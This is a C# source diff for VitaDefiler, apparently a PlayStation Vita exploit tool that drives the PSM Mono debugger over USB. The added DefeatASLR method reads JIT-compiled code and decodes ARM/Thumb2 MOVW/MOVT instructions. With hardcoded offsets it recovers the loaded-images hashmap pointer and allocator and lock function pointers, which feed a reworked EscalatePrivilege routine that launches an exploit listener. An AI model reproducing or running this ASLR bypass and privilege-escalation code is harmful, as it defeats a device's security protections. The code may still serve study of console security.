@@ -15,14 +15,13 @@ namespace VitaDefiler
     class USB
     {
         private static readonly int BLOCK_SIZE = 0x100;
-        private static readonly uint MONO_IMAGES_HASHMAP_POINTER = 0x81465678;
         private static readonly string INSTALL_NAME = "VitaDefilerClient";
 
         private Vita _vita;
 
-        public USB(string port, string package)
+        public USB(string package, string appkeypath)
         {
-            _vita = new Vita(port, INSTALL_NAME, package);
+            _vita = new Vita(INSTALL_NAME, package, appkeypath);
         }
 
         private static Int64 UIntToVitaInt(uint val)
@@ -154,7 +153,115 @@ namespace VitaDefiler
             _vita.Resume();
         }
 
-        public void EscalatePrivilege()
+        public uint DefeatASLR(out uint images_hash_ptr, out uint alloc_fptr, out uint free_fptr, out uint unlock_fptr, out uint lock_fptr)
+        {
+            // step 0, setup
+            long methid_gettype = _vita.GetMethod(true, "System.Type", "GetType", 1, new string[] { "String" });
+            if (methid_gettype < 0)
+            {
+                throw new TargetException("Cannot get method id for Type.GetType");
+            }
+            long methid_getmethod = _vita.GetMethod(true, "System.Type", "GetMethod", 1, new string[] { "String" });
+            if (methid_getmethod < 0)
+            {
+                throw new TargetException("Cannot get method id for Type.GetMethod");
+            }
+            long methid_getruntimehandle = _vita.GetMethod(true, "System.Reflection.MonoMethod", "get_MethodHandle", 0, new string[] {});
+            if (methid_getruntimehandle < 0)
+            {
+                throw new TargetException("Cannot get method id for System.Reflection.MonoMethod.get_MethodHandle");
+            }
+            long methid_fptr = _vita.GetMethod(true, "System.RuntimeMethodHandle", "GetFunctionPointer", 0, new string[] { });
+            if (methid_fptr < 0)
+            {
+                throw new TargetException("Cannot get method id for System.RuntimeMethodHandle.GetFunctionPointer");
+            }
+            long methid_readint32 = _vita.GetMethod(true, "System.Runtime.InteropServices.Marshal", "ReadInt32", 2, new string[] { "IntPtr", "Int32" });
+            if (methid_readint32 < 0)
+            {
+                throw new TargetException("Cannot get method id for ReadInt32");
+            }
+
+            // step 1, get method handle
+            ValueImpl environment_str = _vita.CreateString("System.Environment");
+            ValueImpl env_type = _vita.RunMethod(methid_gettype, null, new ValueImpl[] { environment_str });
+            Console.WriteLine("System.Environment Type object: 0x{0:X}", VitaIntToUInt((Int64)env_type.Objid));
+            ValueImpl exit_str = _vita.CreateString("Exit");
+            env_type.Type = ElementType.Object; // BUG with debugger
+            ValueImpl methodinfo = _vita.RunMethod(methid_getmethod, env_type, new ValueImpl[] { exit_str });
+            Console.WriteLine("System.Environment.Exit MonoMethod object: 0x{0:X}", VitaIntToUInt((Int64)methodinfo.Objid));
+            methodinfo.Type = ElementType.Object; // BUG with debugger
+            ValueImpl runtimehandle = _vita.RunMethod(methid_getruntimehandle, methodinfo, new ValueImpl[] { });
+            Console.WriteLine("System.Environment.Exit RuntimeMethodHandle object: 0x{0:X}", VitaIntToUInt((Int64)runtimehandle.Objid));
+            ValueImpl funcptr = _vita.RunMethod(methid_fptr, runtimehandle, new ValueImpl[] { });
+            Console.WriteLine("System.Environment.Exit function pointer: 0x{0:X}", VitaIntToUInt((Int64)funcptr.Fields[0].Value));
+
+            // step 2, read function pointer to Exit icall from JIT code
+            ValueImpl offset = new ValueImpl();
+            offset.Type = ElementType.I4;
+            offset.Value = 0x90;
+            ValueImpl movw_val = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { funcptr, offset });
+            offset.Value = 0x94;
+            ValueImpl movt_val = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { funcptr, offset });
+            uint addr;
+            uint instr;
+            Utilities.DecodeResult type;
+            instr = VitaIntToUInt((Int32)movw_val.Value);
+            addr = Utilities.DecodeARM32(instr, out type);
+            if (type != Utilities.DecodeResult.INSTRUCTION_MOVW)
+            {
+                throw new TargetException(string.Format("Invalid instruction, expected MOVW, got: 0x{0:X}", instr));
+            }
+            instr = VitaIntToUInt((Int32)movt_val.Value);
+            addr |= Utilities.DecodeARM32(instr, out type) << 16;
+            if (type != Utilities.DecodeResult.INSTRUCTION_MOVT)
+            {
+                throw new TargetException(string.Format("Invalid instruction, expected MOVT, got: 0x{0:X}", instr));
+            }
+            Console.WriteLine("Found fptr for Environment.Exit at: 0x{0:X}", addr);
+
+            // step 3, use offset to find mono_images_init and get hashmap pointer
+            uint mono_images_init_addr = addr - 1 + 0x1206;
+            ValueImpl initaddr = _vita.CreateIntPtr(UIntToVitaInt(mono_images_init_addr));
+            offset.Value = 0;
+            movw_val = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { initaddr, offset });
+            offset.Value = 4;
+            movt_val = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { initaddr, offset });
+            instr = VitaIntToUInt((Int32)movw_val.Value);
+            images_hash_ptr = Utilities.DecodeThumb2((UInt16)(instr & 0xFFFF), (UInt16)(instr >> 16), out type);
+            if (type != Utilities.DecodeResult.INSTRUCTION_MOVW)
+            {
+                throw new TargetException(string.Format("Invalid instruction, expected MOVW, got: 0x{0:X}", instr));
+            }
+            instr = VitaIntToUInt((Int32)movt_val.Value);
+            images_hash_ptr |= (uint)Utilities.DecodeThumb2((UInt16)(instr & 0xFFFF), (UInt16)(instr >> 16), out type) << 16;
+            if (type != Utilities.DecodeResult.INSTRUCTION_MOVT)
+            {
+                throw new TargetException(string.Format("Invalid instruction, expected MOVT, got: 0x{0:X}", instr));
+            }
+            Console.WriteLine("Found ptr for loaded_images_hash at: 0x{0:X}", images_hash_ptr);
+
+            // step 4, use offset to find import table for SceLibMonoBridge functions
+            uint import_table = addr - 1 + 0x12D7A2;
+            ValueImpl faddr = _vita.CreateIntPtr(UIntToVitaInt(import_table));
+            offset.Value = 0x184;
+            ValueImpl fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
+            unlock_fptr = VitaIntToUInt((Int32)fval.Value);
+            offset.Value = 0x198;
+            fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
+            lock_fptr = VitaIntToUInt((Int32)fval.Value);
+            offset.Value = 0x350;
+            fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
+            free_fptr = VitaIntToUInt((Int32)fval.Value);
+            offset.Value = 0x468;
+            fval = _vita.RunMethod(methid_readint32, null, new ValueImpl[] { faddr, offset });
+            alloc_fptr = VitaIntToUInt((Int32)fval.Value);
+            Console.WriteLine("Found unlock 0x{0:X}, lock 0x{1:X}, free 0x{2:X}, alloc 0x{3:X}", unlock_fptr, lock_fptr, free_fptr, alloc_fptr);
+
+            return 0;
+        }
+
+        public void EscalatePrivilege(uint mono_images_hashmap_pointer)
         {
             // step 0, setup
             long methid_readintptr = _vita.GetMethod(true, "System.Runtime.InteropServices.Marshal", "ReadIntPtr", 2, new string[] { "IntPtr", "Int32" });
@@ -176,7 +283,7 @@ namespace VitaDefiler
             ValueImpl zero = new ValueImpl();
             zero.Type = ElementType.I4;
             zero.Value = 0;
-            ValueImpl ptr_to_hashmap = _vita.CreateIntPtr(UIntToVitaInt(MONO_IMAGES_HASHMAP_POINTER));
+            ValueImpl ptr_to_hashmap = _vita.CreateIntPtr(UIntToVitaInt(mono_images_hashmap_pointer));
             ValueImpl offset = new ValueImpl();
             offset.Type = ElementType.I4;
             offset.Value = 0;
@@ -238,13 +345,6 @@ namespace VitaDefiler
              */
             long methid_exploit = _vita.GetMethod(false, "VitaDefilerClient.CommandListener", "StartListener", 0, null);
             _vita.RunMethod(methid_exploit, null, null);
-        }
-
-        public void DefeatASLR()
-        {
-            long methid_getstdout = _vita.GetMethod(true, "System.IO.MonoIO", "get_ConsoleOutput", 0, null);
-            ValueImpl stdout = _vita.RunMethod(methid_getstdout, null, null);
-            Console.WriteLine(VitaIntToUInt((Int64)stdout.Fields[0].Value));
         }
     }
 }
@@ -351,20 +451,20 @@ namespace VitaDefiler.PSM
             }
         }
 
-        private string port;
         private long rootdomain = -1, threadid = -1, corlibid = -1, assid = -1;
         private Guid handle;
         private VitaConnection conn;
         private string name;
         private string package;
+        private string appkeypath;
         private PsmDeviceConsoleCallback callback;
         private Thread reciever;
 
-        public Vita(string portstr, string name, string package)
+        public Vita(string name, string package, string appkeypath)
         {
-            this.port = portstr;
             this.name = name;
             this.package = Path.GetFullPath(package);
+            this.appkeypath = appkeypath;
         }
 
         private void HandleConnErrorHandler(object sender, ErrorHandlerEventArgs args)
@@ -397,6 +497,7 @@ namespace VitaDefiler.PSM
         {
             Console.WriteLine("Waiting for Vita to connect...");
             ScePsmDevice? vita = null;
+            int ret;
             for (; ; )
             {
                 ScePsmDevice[] deviceArray = new ScePsmDevice[8];
@@ -415,34 +516,59 @@ namespace VitaDefiler.PSM
                 }
             }
             Guid devId = vita.Value.guid;
-            Console.WriteLine("Found Vita {0}, serial: {1}", devId, new string(vita.Value.deviceID));
-            if (PSMFunctions.Connect(devId) < 0)
+            string serial = new string(vita.Value.deviceID, 0, 17);
+            Console.WriteLine("Found Vita {0}, serial: {1}", devId, serial);
+            if ((ret = PSMFunctions.Connect(devId)) < 0)
             {
-                Console.WriteLine("Error connecting to Vita.");
+                Console.WriteLine("Error connecting to Vita: 0x{0:X}", ret);
                 throw new IOException("Cannot connect to Vita.");
             }
             this.handle = devId;
-            callback = new PsmDeviceConsoleCallback(consoleCallback);
-            Console.WriteLine("Setting console callback.");
-            PSMFunctions.SetConsoleWrite(this.handle, Marshal.GetFunctionPointerForDelegate(callback));
+
+            // request version or other calls will fail
+            PSMFunctions.Version(this.handle);
+
+#if USE_APP_KEY
+            byte[] buffer = File.ReadAllBytes("kdev.p12");
+
+            if ((ret = PSMFunctions.ExistAppExeKey(this.handle, DRMFunctions.ReadAccountIdFromKdevP12(buffer), "*", "np")) != 1)
+            {
+                Console.WriteLine("Setting app key to: {0}", appkeypath);
+                if ((ret = PSMFunctions.SetAppExeKey(this.handle, appkeypath)) != 0)
+                {
+                    Console.WriteLine("Error setting key: 0x{0:X}", ret);
+                    throw new IOException("Cannot set app key.");
+                }
+            }
+#endif
 
 #if !NO_INSTALL_PACKAGE
             Console.WriteLine("Installing package {0} as {1}.", package, name);
-            if (PSMFunctions.Install(this.handle, package, name) != 0)
+            if ((ret = PSMFunctions.Install(this.handle, package, name)) != 0)
             {
-                Console.WriteLine("Error installing package.");
+                Console.WriteLine("Error installing package: 0x{0:X}", ret);
                 throw new IOException("Cannot connect to Vita.");
             }
 #endif
 
+            callback = new PsmDeviceConsoleCallback(consoleCallback);
+            Console.WriteLine("Setting console callback.");
+            PSMFunctions.SetConsoleWrite(this.handle, Marshal.GetFunctionPointerForDelegate(callback));
+
             Console.WriteLine("Launching {0}.", name);
-            if (PSMFunctions.Launch(this.handle, name, true, false, false, false, "") != 0)
+            if ((ret = PSMFunctions.Launch(this.handle, name, true, false, false, false, "")) != 0)
             {
-                Console.WriteLine("Error running application.");
+                Console.WriteLine("Error running application: 0x{0:X}", ret);
                 throw new IOException("Cannot connect to Vita.");
             }
 
             Console.WriteLine("Connecting debugger.");
+            string port = TransportFunctions.GetVitaPortWithSerial(serial);
+            if (port == null)
+            {
+                Console.WriteLine("Cannot find serial port for {0}", serial);
+                throw new IOException("Cannot find serial port.");
+            }
             conn = new VitaConnection(port);
             conn.EventHandler = new ConnEventHandler();
             conn.ErrorHandler += HandleConnErrorHandler;
@@ -479,8 +605,8 @@ namespace VitaDefiler.PSM
 #if CLEAN_EXIT
             Console.WriteLine("Killing running app.");
             PSMFunctions.Kill(this.handle);
-            Console.WriteLine("Uninstalling app.");
-            PSMFunctions.Uninstall(this.handle, name);
+            //Console.WriteLine("Uninstalling app.");
+            //PSMFunctions.Uninstall(this.handle, name);
             Console.WriteLine("Disconnecting Vita.");
             PSMFunctions.Disconnect(this.handle);
 #endif
